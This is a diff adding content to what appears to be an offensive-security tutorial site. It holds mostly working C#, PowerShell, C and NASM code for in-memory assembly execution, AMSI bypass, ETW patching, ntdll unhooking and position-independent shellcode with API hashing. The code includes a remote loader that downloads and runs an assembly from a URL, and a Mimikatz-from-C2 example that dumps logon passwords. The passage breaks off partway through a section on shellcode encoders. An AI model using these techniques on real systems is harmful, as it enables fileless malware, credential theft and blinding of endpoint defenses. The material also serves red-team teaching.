+            0x12, 0x13, 0x02, 0x17, 0x11, 0x11,
+            0x0E, 0x02, 0x12, 0x0E
+        };
+        
+        string dll = Deobfuscate(dllName, 0x67);
+        string func = Deobfuscate(funcName, 0x67);
+        
+        // Now resolve dynamically
+        // EDR sees no suspicious strings!
+    }
+}`,
+          language: "csharp"
+        },
+        {
+          title: "3. In-Memory Assembly Execution",
+          content: `Load and execute .NET assemblies directly from memory without touching disk. Essential for fileless attacks and post-exploitation frameworks.
+
+TECHNIQUES:
+• Assembly.Load(byte[]) - load from memory
+• Reflection to invoke methods
+• Can load dependencies recursively
+• Execute .NET executables/DLLs
+
+USE CASES:
+• Execute C# payloads in-memory
+• Load tools without dropping files
+• Chain multiple .NET tools
+• Post-exploitation framework`,
+          code: `using System;
+using System.Reflection;
+using System.IO;
+
+class InMemoryExecution {
+    // Load and execute assembly from bytes
+    public static object ExecuteAssembly(
+        byte[] assemblyBytes,
+        string className,
+        string methodName,
+        object[] parameters) {
+        
+        // Load assembly into memory
+        Assembly asm = Assembly.Load(assemblyBytes);
+        
+        // Get type
+        Type type = asm.GetType(className);
+        if (type == null) {
+            throw new Exception($"Type {className} not found");
+        }
+        
+        // Get method
+        MethodInfo method = type.GetMethod(methodName);
+        if (method == null) {
+            throw new Exception($"Method {methodName} not found");
+        }
+        
+        // Create instance if not static
+        object instance = null;
+        if (!method.IsStatic) {
+            instance = Activator.CreateInstance(type);
+        }
+        
+        // Invoke method
+        return method.Invoke(instance, parameters);
+    }
+    
+    // Execute Main() of a .NET executable
+    public static void ExecuteProgram(byte[] exeBytes,
+                                      string[] args) {
+        Assembly asm = Assembly.Load(exeBytes);
+        
+        // Find entry point
+        MethodInfo entry = asm.EntryPoint;
+        if (entry == null) {
+            throw new Exception("No entry point found");
+        }
+        
+        // Prepare parameters
+        object[] parameters = new object[] { args };
+        
+        // Execute
+        entry.Invoke(null, parameters);
+    }
+}
+
+class Program {
+    static void Main() {
+        // Example: Load Mimikatz from memory
+        byte[] mimikatzBytes = DownloadFromC2();
+        
+        // Execute
+        InMemoryExecution.ExecuteProgram(
+            mimikatzBytes,
+            new string[] { "sekurlsa::logonpasswords" }
+        );
+    }
+    
+    static byte[] DownloadFromC2() {
+        // Stub - download from C2 server
+        return new byte[0];
+    }
+}
+
+// ADVANCED: Loading dependencies
+class AssemblyResolver {
+    public static void SetupResolver() {
+        AppDomain.CurrentDomain.AssemblyResolve += 
+            ResolveAssembly;
+    }
+    
+    static Assembly ResolveAssembly(
+        object sender, ResolveEventArgs args) {
+        
+        // When .NET can't find assembly, we provide it
+        Console.WriteLine($"Resolving: {args.Name}");
+        
+        // Load from embedded resource or download
+        byte[] asmBytes = GetAssemblyBytes(args.Name);
+        
+        if (asmBytes != null) {
+            return Assembly.Load(asmBytes);
+        }
+        
+        return null;
+    }
+    
+    static byte[] GetAssemblyBytes(string name) {
+        // Stub - get from resources or C2
+        return null;
+    }
+}
+
+// COMPLETE EXAMPLE: Remote loader
+class RemoteLoader {
+    static void Main(string[] args) {
+        if (args.Length < 2) {
+            Console.WriteLine("Usage: loader <url> <args>");
+            return;
+        }
+        
+        // Setup dependency resolver
+        AssemblyResolver.SetupResolver();
+        
+        // Download assembly
+        using (var wc = new System.Net.WebClient()) {
+            byte[] data = wc.DownloadData(args[0]);
+            
+            // Prepare arguments
+            string[] toolArgs = new string[args.Length - 1];
+            Array.Copy(args, 1, toolArgs, 0, toolArgs.Length);
+            
+            // Execute
+            InMemoryExecution.ExecuteProgram(data, toolArgs);
+        }
+        
+        Console.WriteLine("[+] Execution complete");
+    }
+}
+
+// OPSEC CONSIDERATIONS:
+// - Assembly.Load triggers ETW events
+// - AMSI can scan loaded assemblies
+// - Consider AMSI/ETW bypass first
+// - Use obfuscation on payload
+// - Encrypt during transit`,
+          language: "csharp"
+        }
+      ]
+    },
+    "evasion": {
+      title: "Evasion Techniques - Bypassing Defenses",
+      sections: [
+        {
+          title: "1. AMSI Bypass - Defeating Script Scanning",
+          content: `AMSI (Antimalware Scan Interface) scans scripts and in-memory content before execution. Bypassing AMSI is often the first step in post-exploitation.
+
+HOW AMSI WORKS:
+• PowerShell/C# calls amsi.dll
+• Content sent to AmsiScanBuffer
+• AV vendor scans buffer
+• Blocks malicious content
+
+BYPASS STRATEGIES:
+• Patch AmsiScanBuffer in memory
+• Force AMSI initialization failure
+• Obfuscate malicious strings
+• Unhook amsi.dll functions`,
+          code: `using System;
+using System.Runtime.InteropServices;
+
+class AMSIBypass {
+    // Method 1: Patch AmsiScanBuffer
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern IntPtr LoadLibrary(string lpFileName);
+    
+    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
+    static extern IntPtr GetProcAddress(
+        IntPtr hModule, string lpProcName);
+    
+    [DllImport("kernel32.dll")]
+    static extern bool VirtualProtect(
+        IntPtr lpAddress,
+        UIntPtr dwSize,
+        uint flNewProtect,
+        out uint lpflOldProtect);
+    
+    public static bool PatchAMSI() {
+        try {
+            // Load amsi.dll
+            IntPtr hAmsi = LoadLibrary("amsi.dll");
+            if (hAmsi == IntPtr.Zero) {
+                return false;
+            }
+            
+            // Get AmsiScanBuffer address
+            IntPtr pAmsiScanBuffer = GetProcAddress(
+                hAmsi, "AmsiScanBuffer");
+            
+            if (pAmsiScanBuffer == IntPtr.Zero) {
+                return false;
+            }
+            
+            // Patch with "return 0"
+            // x64: B8 57 00 07 80 C3 (mov eax, 0x80070057; ret)
+            byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+            
+            // Change memory protection
+            uint oldProtect;
+            if (!VirtualProtect(pAmsiScanBuffer,
+                (UIntPtr)patch.Length, 0x40, out oldProtect)) {
+                return false;
+            }
+            
+            // Write patch
+            Marshal.Copy(patch, 0, pAmsiScanBuffer, patch.Length);
+            
+            // Restore protection
+            VirtualProtect(pAmsiScanBuffer,
+                (UIntPtr)patch.Length, oldProtect, out oldProtect);
+            
+            Console.WriteLine("[+] AMSI patched");
+            return true;
+        }
+        catch (Exception ex) {
+            Console.WriteLine($"[-] AMSI patch failed: {ex.Message}");
+            return false;
+        }
+    }
+    
+    // Method 2: Force initialization failure
+    [DllImport("amsi.dll")]
+    static extern int AmsiInitialize(
+        string appName, out IntPtr amsiContext);
+    
+    public static void ForceAMSIFailure() {
+        // Trigger AMSI initialization with bad params
+        // This can cause AMSI to fail open
+        IntPtr ctx;
+        AmsiInitialize(null, out ctx);
+    }
+    
+    // Method 3: Context corruption
+    public static bool CorruptAMSIContext() {
+        try {
+            IntPtr hAmsi = LoadLibrary("amsi.dll");
+            IntPtr pAmsiContext = GetProcAddress(
+                hAmsi, "AmsiInitialize");
+            
+            // Find AMSI_RESULT enum in memory
+            // Set to AMSI_RESULT_CLEAN for all scans
+            
+            // (Advanced implementation left as exercise)
+            
+            return true;
+        }
+        catch {
+            return false;
+        }
+    }
+}
+
+class Program {
+    static void Main() {
+        // Bypass AMSI
+        if (AMSIBypass.PatchAMSI()) {
+            Console.WriteLine("[+] AMSI bypassed");
+            
+            // Now we can run suspicious code
+            ExecuteMaliciousScript();
+        }
+    }
+    
+    static void ExecuteMaliciousScript() {
+        // Previously blocked by AMSI
+        Console.WriteLine("Executing payload...");
+    }
+}
+
+// OBFUSCATION METHOD
+// ==================
+
+class ObfuscatedAMSI {
+    static void Main() {
+        // Obfuscate "AMSI" string
+        string a = "A" + "M" + "S" + "I";
+        
+        // Base64 obfuscation
+        string b64 = "QW1zaVNjYW5CdWZmZXI=";  // AmsiScanBuffer
+        string func = System.Text.Encoding.UTF8.GetString(
+            Convert.FromBase64String(b64));
+        
+        // Now patch using obfuscated strings
+    }
+}
+
+// POWERSHELL AMSI BYPASS
+// ======================
+/*
+# Classic one-liner (often signature-detected now)
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
+    GetField('amsiInitFailed','NonPublic,Static').
+    SetValue($null,$true)
+
+# More advanced (memory patch)
+$a=[Ref].Assembly.GetTypes();
+Foreach($b in $a) {
+    if ($b.Name -like "*iUtils") {
+        $c=$b
+    }
+};
+$d=$c.GetFields('NonPublic,Static');
+Foreach($e in $d) {
+    if ($e.Name -like "*Context") {
+        $f=$e
+    }
+};
+$g=$f.GetValue($null);
+[IntPtr]$ptr=$g;
+[Int32[]]$buf = @(0);
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+*/`,
+          language: "csharp"
+        },
+        {
+          title: "2. ETW Patching - Blind the Defenders",
+          content: `ETW (Event Tracing for Windows) provides telemetry to EDR. Patching ETW prevents your actions from being logged.
+
+ETW EVENTS THAT EXPOSE YOU:
+• PowerShell script blocks
+• .NET assembly loads
+• Process creation
+• Thread creation
+• Image loads
+
+PATCHING TECHNIQUE:
+• Find EtwEventWrite in ntdll.dll
+• Patch with "ret" instruction (0xC3)
+• All ETW logging fails silently`,
+          code: `using System;
+using System.Runtime.InteropServices;
+
+class ETWBypass {
+    [DllImport("kernel32.dll")]
+    static extern IntPtr GetModuleHandle(string lpModuleName);
+    
+    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
+    static extern IntPtr GetProcAddress(
+        IntPtr hModule, string lpProcName);
+    
+    [DllImport("kernel32.dll")]
+    static extern bool VirtualProtect(
+        IntPtr lpAddress,
+        UIntPtr dwSize,
+        uint flNewProtect,
+        out uint lpflOldProtect);
+    
+    public static bool PatchETW() {
+        try {
+            // Get ntdll.dll
+            IntPtr hNtdll = GetModuleHandle("ntdll.dll");
+            if (hNtdll == IntPtr.Zero) {
+                Console.WriteLine("[-] Failed to get ntdll");
+                return false;
+            }
+            
+            // Get EtwEventWrite address
+            IntPtr pEtwEventWrite = GetProcAddress(
+                hNtdll, "EtwEventWrite");
+            
+            if (pEtwEventWrite == IntPtr.Zero) {
+                Console.WriteLine("[-] EtwEventWrite not found");
+                return false;
+            }
+            
+            Console.WriteLine($"[*] EtwEventWrite at 0x{pEtwEventWrite:X}");
+            
+            // Patch bytes (x64)
+            // 33 C0  xor eax, eax  (return 0)
+            // C3     ret
+            byte[] patch = { 0x33, 0xC0, 0xC3 };
+            
+            // Or simpler: just ret (may cause issues)
+            // byte[] patch = { 0xC3 };
+            
+            // Change protection to RWX
+            uint oldProtect;
+            if (!VirtualProtect(pEtwEventWrite,
+                (UIntPtr)patch.Length, 0x40, out oldProtect)) {
+                Console.WriteLine("[-] VirtualProtect failed");
+                return false;
+            }
+            
+            // Apply patch
+            Marshal.Copy(patch, 0, pEtwEventWrite, patch.Length);
+            
+            // Restore original protection
+            VirtualProtect(pEtwEventWrite,
+                (UIntPtr)patch.Length, oldProtect, out oldProtect);
+            
+            Console.WriteLine("[+] ETW patched successfully");
+            return true;
+        }
+        catch (Exception ex) {
+            Console.WriteLine($"[-] ETW patch failed: {ex.Message}");
+            return false;
+        }
+    }
+    
+    // Alternative: Patch EtwEventWriteFull
+    public static bool PatchETWFull() {
+        try {
+            IntPtr hNtdll = GetModuleHandle("ntdll.dll");
+            IntPtr pEtw = GetProcAddress(hNtdll, "EtwEventWriteFull");
+            
+            if (pEtw == IntPtr.Zero) {
+                return false;
+            }
+            
+            byte[] patch = { 0x33, 0xC0, 0xC3 };
+            uint oldProtect;
+            
+            VirtualProtect(pEtw, (UIntPtr)3, 0x40, out oldProtect);
+            Marshal.Copy(patch, 0, pEtw, 3);
+            VirtualProtect(pEtw, (UIntPtr)3, oldProtect, out oldProtect);
+            
+            Console.WriteLine("[+] EtwEventWriteFull patched");
+            return true;
+        }
+        catch {
+            return false;
+        }
+    }
+}
+
+// Combined bypass
+class DefensiveEvasion {
+    public static void BypassAll() {
+        Console.WriteLine("[*] Bypassing defenses...");
+        
+        // 1. Patch AMSI
+        if (AMSIBypass.PatchAMSI()) {
+            Console.WriteLine("[+] AMSI bypassed");
+        }
+        
+        // 2. Patch ETW
+        if (ETWBypass.PatchETW()) {
+            Console.WriteLine("[+] ETW blinded");
+        }
+        
+        if (ETWBypass.PatchETWFull()) {
+            Console.WriteLine("[+] ETW Full blinded");
+        }
+        
+        Console.WriteLine("[+] All defenses bypassed");
+        Console.WriteLine("[*] Ready for payload execution");
+    }
+}
+
+class Program {
+    static void Main() {
+        DefensiveEvasion.BypassAll();
+        
+        // Now execute your payload with reduced visibility
+        ExecutePayload();
+    }
+    
+    static void ExecutePayload() {
+        Console.WriteLine("[*] Payload executing...");
+        // Your offensive operations here
+    }
+}
+
+// DETECTION NOTES:
+// ===============
+// - Memory patching detected by some EDR
+// - Suspicious VirtualProtect calls monitored
+// - Consider indirect syscalls for patching
+// - May need to disable PatchGuard on kernel
+// - Test against specific EDR solutions`,
+          language: "csharp"
+        },
+        {
+          title: "3. API Unhooking - Removing EDR Hooks",
+          content: `EDR vendors hook ntdll.dll functions to monitor behavior. Unhooking restores clean copies of these functions.
+
+HOW EDR HOOKS WORK:
+• DLL loads into your process
+• Modifies start of ntdll functions
+• Inserts JMP to EDR code
+• EDR inspects parameters/behavior
+• Allows or blocks operation
+
+UNHOOKING TECHNIQUE:
+• Read clean ntdll.dll from disk
+• Parse PE to find .text section
+• Copy clean .text over hooked version
+• Now APIs call kernel directly`,
+          code: `using System;
+using System.Runtime.InteropServices;
+
+class APIUnhooking {
+    [DllImport("kernel32.dll")]
+    static extern IntPtr GetModuleHandle(string lpModuleName);
+    
+    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
+    static extern IntPtr CreateFileW(
+        string lpFileName,
+        uint dwDesiredAccess,
+        uint dwShareMode,
+        IntPtr lpSecurityAttributes,
+        uint dwCreationDisposition,
+        uint dwFlagsAndAttributes,
+        IntPtr hTemplateFile);
+    
+    [DllImport("kernel32.dll")]
+    static extern IntPtr CreateFileMappingW(
+        IntPtr hFile,
+        IntPtr lpAttributes,
+        uint flProtect,
+        uint dwMaximumSizeHigh,
+        uint dwMaximumSizeLow,
+        string lpName);
+    
+    [DllImport("kernel32.dll")]
+    static extern IntPtr MapViewOfFile(
+        IntPtr hFileMappingObject,
+        uint dwDesiredAccess,
+        uint dwFileOffsetHigh,
+        uint dwFileOffsetLow,
+        UIntPtr dwNumberOfBytesToMap);
+    
+    [DllImport("kernel32.dll")]
+    static extern bool UnmapViewOfFile(IntPtr lpBaseAddress);
+    
+    [DllImport("kernel32.dll")]
+    static extern bool CloseHandle(IntPtr hObject);
+    
+    [DllImport("kernel32.dll")]
+    static extern bool VirtualProtect(
+        IntPtr lpAddress,
+        UIntPtr dwSize,
+        uint flNewProtect,
+        out uint lpflOldProtect);
+    
+    [StructLayout(LayoutKind.Sequential)]
+    struct IMAGE_DOS_HEADER {
+        public ushort e_magic;
+        // ... (abbreviated)
+        public int e_lfanew;
+    }
+    
+    [StructLayout(LayoutKind.Sequential)]
+    struct IMAGE_NT_HEADERS {
+        public uint Signature;
+        public IMAGE_FILE_HEADER FileHeader;
+        public IMAGE_OPTIONAL_HEADER OptionalHeader;
+    }
+    
+    [StructLayout(LayoutKind.Sequential)]
+    struct IMAGE_FILE_HEADER {
+        public ushort Machine;
+        public ushort NumberOfSections;
+        // ... (abbreviated)
+    }
+    
+    [StructLayout(LayoutKind.Sequential)]
+    struct IMAGE_OPTIONAL_HEADER {
+        public ushort Magic;
+        // ... (abbreviated)
+        public uint SizeOfImage;
+    }
+    
+    [StructLayout(LayoutKind.Sequential)]
+    struct IMAGE_SECTION_HEADER {
+        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
+        public byte[] Name;
+        public uint VirtualSize;
+        public uint VirtualAddress;
+        public uint SizeOfRawData;
+        public uint PointerToRawData;
+        // ... (abbreviated)
+    }
+    
+    public static bool UnhookNtdll() {
+        try {
+            // 1. Get current ntdll base address
+            IntPtr hNtdll = GetModuleHandle("ntdll.dll");
+            if (hNtdll == IntPtr.Zero) {
+                Console.WriteLine("[-] Failed to get ntdll");
+                return false;
+            }
+            
+            Console.WriteLine($"[*] Ntdll loaded at 0x{hNtdll:X}");
+            
+            // 2. Map clean ntdll from disk
+            IntPtr hFile = CreateFileW(
+                @"C:\\Windows\\System32\\ntdll.dll",
+                0x80000000,  // GENERIC_READ
+                1,           // FILE_SHARE_READ
+                IntPtr.Zero,
+                3,           // OPEN_EXISTING
+                0,
+                IntPtr.Zero);
+            
+            if (hFile == (IntPtr)(-1)) {
+                Console.WriteLine("[-] Failed to open ntdll.dll");
+                return false;
+            }
+            
+            IntPtr hMapping = CreateFileMappingW(
+                hFile, IntPtr.Zero, 2, 0, 0, null);  // PAGE_READONLY
+            CloseHandle(hFile);
+            
+            if (hMapping == IntPtr.Zero) {
+                Console.WriteLine("[-] CreateFileMapping failed");
+                return false;
+            }
+            
+            IntPtr pCleanNtdll = MapViewOfFile(
+                hMapping, 4, 0, 0, UIntPtr.Zero);  // FILE_MAP_READ
+            CloseHandle(hMapping);
+            
+            if (pCleanNtdll == IntPtr.Zero) {
+                Console.WriteLine("[-] MapViewOfFile failed");
+                return false;
+            }
+            
+            Console.WriteLine($"[*] Clean ntdll mapped at 0x{pCleanNtdll:X}");
+            
+            // 3. Parse PE headers (clean copy)
+            IMAGE_DOS_HEADER dosHeader = Marshal.PtrToStructure<IMAGE_DOS_HEADER>(
+                pCleanNtdll);
+            
+            IntPtr pNtHeaders = pCleanNtdll + dosHeader.e_lfanew;
+            IMAGE_NT_HEADERS ntHeaders = Marshal.PtrToStructure<IMAGE_NT_HEADERS>(
+                pNtHeaders);
+            
+            // 4. Find .text section
+            IntPtr pSection = pNtHeaders + Marshal.SizeOf<IMAGE_NT_HEADERS>();
+            
+            for (int i = 0; i < ntHeaders.FileHeader.NumberOfSections; i++) {
+                IMAGE_SECTION_HEADER section = 
+                    Marshal.PtrToStructure<IMAGE_SECTION_HEADER>(
+                        pSection + (i * Marshal.SizeOf<IMAGE_SECTION_HEADER>()));
+                
+                string sectionName = System.Text.Encoding.ASCII.GetString(
+                    section.Name).TrimEnd('\\0');
+                
+                if (sectionName == ".text") {
+                    Console.WriteLine($"[*] Found .text section");
+                    Console.WriteLine($"    VA: 0x{section.VirtualAddress:X}");
+                    Console.WriteLine($"    Size: 0x{section.VirtualSize:X}");
+                    
+                    // 5. Unhook: copy clean .text
+                    IntPtr pHookedText = hNtdll + (int)section.VirtualAddress;
+                    IntPtr pCleanText = pCleanNtdll + (int)section.VirtualAddress;
+                    
+                    // Change protection
+                    uint oldProtect;
+                    if (!VirtualProtect(pHookedText,
+                        (UIntPtr)section.VirtualSize, 0x40, out oldProtect)) {
+                        Console.WriteLine("[-] VirtualProtect failed");
+                        UnmapViewOfFile(pCleanNtdll);
+                        return false;
+                    }
+                    
+                    // Copy clean bytes
+                    byte[] cleanBytes = new byte[section.VirtualSize];
+                    Marshal.Copy(pCleanText, cleanBytes, 0, (int)section.VirtualSize);
+                    Marshal.Copy(cleanBytes, 0, pHookedText, (int)section.VirtualSize);
+                    
+                    // Restore protection
+                    VirtualProtect(pHookedText,
+                        (UIntPtr)section.VirtualSize, oldProtect, out oldProtect);
+                    
+                    Console.WriteLine("[+] Ntdll.dll unhooked!");
+                    break;
+                }
+            }
+            
+            // Cleanup
+            UnmapViewOfFile(pCleanNtdll);
+            
+            return true;
+        }
+        catch (Exception ex) {
+            Console.WriteLine($"[-] Unhooking failed: {ex.Message}");
+            return false;
+        }
+    }
+}
+
+class Program {
+    static void Main() {
+        Console.WriteLine("[*] Starting API unhooking...");
+        
+        if (APIUnhooking.UnhookNtdll()) {
+            Console.WriteLine("[+] Ready for stealthy operations");
+            // Now your syscalls bypass EDR hooks
+        }
+    }
+}`,
+          language: "csharp"
+        }
+      ]
+    },
+    "shellcode": {
+      title: "Shellcode Development - Position Independent Code",
+      sections: [
+        {
+          title: "1. x64 Assembly Fundamentals",
+          content: `Shellcode is machine code that executes without dependencies. Understanding x64 assembly is essential for writing position-independent, compact payloads.
+
+X64 CALLING CONVENTION (Windows):
+• RCX - First argument
+• RDX - Second argument
+• R8  - Third argument
+• R9  - Fourth argument
+• Stack - Additional arguments
+• RAX - Return value
+
+PRESERVED REGISTERS:
+• RBX, RBP, RDI, RSI, R12-R15 must be saved
+• All others can be modified
+
+SHELLCODE REQUIREMENTS:
+• No absolute addresses (position independent)
+• No static strings (use stack or RIP-relative)
+• Resolve APIs dynamically
+• Handle own imports`,
+          code: `; Basic x64 shellcode structure (NASM syntax)
+BITS 64
+
+; Entry point
+start:
+    ; 1. Save registers (optional for shellcode)
+    push rbx
+    push rsi
+    push rdi
+    
+    ; 2. Get PEB (Process Environment Block)
+    ; fs:[0x30] = PEB on x64 Windows
+    mov rax, [gs:0x60]        ; PEB pointer
+    
+    ; 3. Get kernel32.dll base from PEB
+    mov rax, [rax + 0x18]     ; PEB->Ldr
+    mov rsi, [rax + 0x20]     ; InMemoryOrderModuleList
+    lodsq                      ; First entry (ntdll.dll)
+    xchg rsi, rax
+    lodsq                      ; Second entry (kernel32.dll)
+    mov rbx, [rax + 0x20]     ; DllBase (kernel32)
+    
+    ; 4. Parse PE headers to find exports
+    mov r8d, [rbx + 0x3C]     ; e_lfanew (PE header offset)
+    lea r9, [rbx + r8]        ; NT headers
+    mov r8d, [r9 + 0x88]      ; Export directory RVA
+    lea r9, [rbx + r8]        ; Export directory
+    
+    ; 5. Find function by hash
+    ; (See GetProcAddress implementation)
+    
+    ; 6. Call WinAPI functions
+    ; LoadLibraryA, GetProcAddress, etc.
+    
+    ; 7. Execute payload
+    call execute_payload
+    
+    ; 8. Cleanup and exit
+    pop rdi
+    pop rsi
+    pop rbx
+    ret
+
+execute_payload:
+    ; Your payload code here
+    ; E.g., spawn cmd.exe, reverse shell, etc.
+    ret
+
+; ============================================
+; FUNCTION: Find API by hash
+; ============================================
+; Input: RCX = DLL base, EDX = hash
+; Output: RAX = function address
+
+find_function:
+    push rbx
+    push rcx
+    push rdx
+    push rsi
+    push rdi
+    
+    mov rdi, rcx              ; DLL base
+    mov r8d, [rdi + 0x3C]     ; e_lfanew
+    lea r9, [rdi + r8]        ; NT headers
+    mov r8d, [r9 + 0x88]      ; Export RVA
+    lea r9, [rdi + r8]        ; Export directory
+    
+    mov ecx, [r9 + 0x18]      ; NumberOfNames
+    mov r10d, [r9 + 0x20]     ; AddressOfNames RVA
+    lea r10, [rdi + r10]      ; Names array
+    
+.loop:
+    dec ecx
+    mov esi, [r10 + rcx*4]    ; Name RVA
+    lea rsi, [rdi + rsi]      ; Name string
+    
+    ; Hash the name
+    xor rax, rax
+    xor rbx, rbx
+    
+.hash_loop:
+    lodsb                     ; Load byte
+    test al, al               ; Check null terminator
+    jz .hash_done
+    ror rbx, 13               ; ROR13 hash
+    add rbx, rax
+    jmp .hash_loop
+    
+.hash_done:
+    cmp ebx, edx              ; Compare with target hash
+    jne .loop
+    
+    ; Found! Get function address
+    mov r11d, [r9 + 0x24]     ; AddressOfNameOrdinals
+    lea r11, [rdi + r11]
+    movzx ecx, word [r11 + rcx*2]  ; Ordinal
+    
+    mov r11d, [r9 + 0x1C]     ; AddressOfFunctions
+    lea r11, [rdi + r11]
+    mov eax, [r11 + rcx*4]    ; Function RVA
+    lea rax, [rdi + rax]      ; Function address
+    
+    pop rdi
+    pop rsi
+    pop rdx
+    pop rcx
+    pop rbx
+    ret
+
+; ============================================
+; COMPLETE EXAMPLE: MessageBox shellcode
+; ============================================
+
+bits 64
+
+start:
+    ; Get kernel32 base
+    xor rcx, rcx
+    mov rax, [gs:rcx + 0x60]  ; PEB
+    mov rax, [rax + 0x18]     ; Ldr
+    mov rax, [rax + 0x20]     ; InMemoryOrderModuleList
+    mov rax, [rax]            ; Second entry
+    mov rax, [rax]            ; Third entry (kernel32)
+    mov rbx, [rax + 0x20]     ; DllBase
+    
+    ; Get LoadLibraryA
+    mov rcx, rbx
+    mov edx, 0xec0e4e8e       ; Hash("LoadLibraryA")
+    call find_function
+    mov r15, rax              ; Save LoadLibraryA
+    
+    ; Load user32.dll
+    lea rcx, [rel user32_dll]
+    call r15                  ; LoadLibraryA("user32.dll")
+    mov rbx, rax              ; user32 base
+    
+    ; Get MessageBoxA
+    mov rcx, rbx
+    mov edx, 0x384f8e8d       ; Hash("MessageBoxA")
+    call find_function
+    mov r14, rax              ; Save MessageBoxA
+    
+    ; Call MessageBoxA
+    xor rcx, rcx              ; hWnd = NULL
+    lea rdx, [rel msg_text]   ; lpText
+    lea r8, [rel msg_title]   ; lpCaption
+    xor r9, r9                ; uType = MB_OK
+    call r14
+    
+    ret
+
+user32_dll: db "user32.dll", 0
+msg_text:   db "Shellcode!", 0
+msg_title:  db "POC", 0
+
+; Compile: nasm -f win64 shellcode.asm -o shellcode.obj
+; Link: ld -m i386pep shellcode.obj -o shellcode.exe
+; Extract: objcopy -O binary --only-section=.text shellcode.exe shellcode.bin`,
+          language: "nasm"
+        },
+        {
+          title: "2. API Hashing - Hiding Function Names",
+          content: `API hashing dynamically resolves functions without storing their names. This avoids signature detection and makes reverse engineering harder.
+
+WHY API HASHING:
+• No function name strings in shellcode
+• Smaller payload size
+• Defeats string-based detection
+• Standard technique in exploits
+
+COMMON HASH ALGORITHMS:
+• ROR13 - Most common, fast
+• CRC32 - Good distribution
+• FNV1a - Fast, simple
+• Custom algorithms`,
+          code: `// C implementation of ROR13 hash
+#include <windows.h>
+#include <stdio.h>
+
+// ROR13 hash algorithm
+DWORD HashString(const char* str) {
+    DWORD hash = 0;
+    
+    while (*str) {
+        hash = _rotr(hash, 13);  // Rotate right 13 bits
+        hash += *str;
+        str++;
+    }
+    
+    return hash;
+}
+
+// Generate hash table
+void GenerateHashes() {
+    const char* functions[] = {
+        "LoadLibraryA",
+        "GetProcAddress",
+        "VirtualAlloc",
+        "CreateThread",
+        "WaitForSingleObject",
+        "ExitProcess",
+        "MessageBoxA",
+        "CreateProcessA"
+    };
+    
+    printf("// API Hash Table\\n");
+    printf("#define HASH_%-20s 0x%08X\\n\\n", 
+           "LoadLibraryA", HashString("LoadLibraryA"));
+    
+    for (int i = 0; i < sizeof(functions)/sizeof(char*); i++) {
+        printf("#define HASH_%-20s 0x%08X\\n",
+               functions[i], HashString(functions[i]));
+    }
+}
+
+// Find function by hash in export table
+PVOID GetFunctionByHash(HMODULE hModule, DWORD dwHash) {
+    BYTE* pBase = (BYTE*)hModule;
+    
+    // Parse PE headers
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
+    PIMAGE_NT_HEADERS pNt = 
+        (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
+    
+    // Get export directory
+    IMAGE_DATA_DIRECTORY exportDir = 
+        pNt->OptionalHeader.DataDirectory[
+            IMAGE_DIRECTORY_ENTRY_EXPORT];
+    
+    PIMAGE_EXPORT_DIRECTORY pExport = 
+        (PIMAGE_EXPORT_DIRECTORY)(pBase + 
+                                  exportDir.VirtualAddress);
+    
+    // Get arrays
+    DWORD* pNames = (DWORD*)(pBase + pExport->AddressOfNames);
+    WORD* pOrdinals = (WORD*)(pBase + 
+                              pExport->AddressOfNameOrdinals);
+    DWORD* pFunctions = (DWORD*)(pBase + 
+                                  pExport->AddressOfFunctions);
+    
+    // Search for hash
+    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
+        const char* szName = (const char*)(pBase + pNames[i]);
+        
+        if (HashString(szName) == dwHash) {
+            WORD ordinal = pOrdinals[i];
+            PVOID pFunc = pBase + pFunctions[ordinal];
+            return pFunc;
+        }
+    }
+    
+    return NULL;
+}
+
+// Example usage
+#define HASH_LoadLibraryA      0xec0e4e8e
+#define HASH_GetProcAddress    0x7c0dfcaa
+#define HASH_VirtualAlloc      0x91afca54
+#define HASH_CreateThread      0x799aacc6
+
+typedef HMODULE (WINAPI *fnLoadLibraryA)(LPCSTR);
+typedef FARPROC (WINAPI *fnGetProcAddress)(HMODULE, LPCSTR);
+typedef LPVOID (WINAPI *fnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
+
+int main() {
+    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+    
+    // Resolve by hash
+    fnLoadLibraryA pLoadLib = (fnLoadLibraryA)
+        GetFunctionByHash(hKernel32, HASH_LoadLibraryA);
+    
+    fnGetProcAddress pGetProc = (fnGetProcAddress)
+        GetFunctionByHash(hKernel32, HASH_GetProcAddress);
+    
+    fnVirtualAlloc pVirtualAlloc = (fnVirtualAlloc)
+        GetFunctionByHash(hKernel32, HASH_VirtualAlloc);
+    
+    if (pLoadLib && pGetProc && pVirtualAlloc) {
+        printf("[+] Functions resolved by hash\\n");
+        
+        // Use them normally
+        HMODULE hUser32 = pLoadLib("user32.dll");
+        // ...
+    }
+    
+    return 0;
+}
+
+// ALTERNATIVE: CRC32 hashing
+DWORD CRC32Hash(const char* str) {
+    DWORD crc = 0xFFFFFFFF;
+    
+    while (*str) {
+        crc ^= *str++;
+        
+        for (int i = 0; i < 8; i++) {
+            crc = (crc >> 1) ^ (0xEDB88320 & -(crc & 1));
+        }
+    }
+    
+    return ~crc;
+}
+
+// Custom hash (more obscure)
+DWORD CustomHash(const char* str) {
+    DWORD hash = 5381;
+    
+    while (*str) {
+        hash = ((hash << 5) + hash) + *str++;  // hash * 33 + c
+    }
+    
+    return hash;
+}`,
+          language: "c"
+        },
+        {
+          title: "3. Shellcode Encoders & Encryption",
+          content: `Raw shellcode contains null bytes and suspicious patterns. Encoders transform shellcode into benign-looking data, with a decoder stub that reconstructs it at runtime.
+
+COMMON ENCODERS:
+• XOR - Simple, effective
+• ROT-N - Caesar cipher
+• Base64 - Looks like data
+• Custom algorithms
+
+ENCRYPTION:
+• AES - Strong encryption
+• RC4 - Lightweight stream cipher
+• ChaCha20 - Modern, fast
+
+STAGED SHELLCODE:
+• Small Stage 1 downloads Stage 2
+• Stage 2 is encrypted/encoded
